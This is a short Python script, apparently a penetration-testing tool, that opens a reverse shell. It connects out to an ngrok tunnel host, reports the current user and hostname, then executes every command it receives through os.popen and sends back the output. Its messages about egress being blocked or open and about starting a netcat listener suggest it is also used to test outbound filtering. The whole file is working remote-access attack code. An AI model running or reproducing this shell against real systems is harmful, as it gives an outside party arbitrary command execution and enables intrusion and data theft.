import socket
import os

LHOST = "0.tcp.in.ngrok.io"
LPORT = 19569

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((LHOST, LPORT))
    s.settimeout(None)  # remove timeout after connect for interactive use

    s.send(b"[PT] Interactive session open. Type commands.\n")
    s.send(f"[PT] Connected as: {os.popen('whoami').read().strip()}\n".encode())
    s.send(f"[PT] Host: {os.popen('hostname').read().strip()}\n\n".encode())
    s.send(b">> ")

    while True:
        cmd = s.recv(1024).decode(errors="ignore").strip()

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "bye"):
            s.send(b"[PT] Session closed.\n")
            break

        output = os.popen(cmd).read()
        if not output:
            output = "(no output)\n"

        s.send(output.encode(errors="ignore"))
        s.send(b">> ")

    s.close()
    print("[+] Session ended cleanly.")

except socket.timeout:
    print("[-] BLOCKED — connection timed out")
except ConnectionRefusedError:
    print("[-] EGRESS OPEN but no listener — start nc first")
except Exception as e:
    print(f"[-] {type(e).__name__}: {e}")
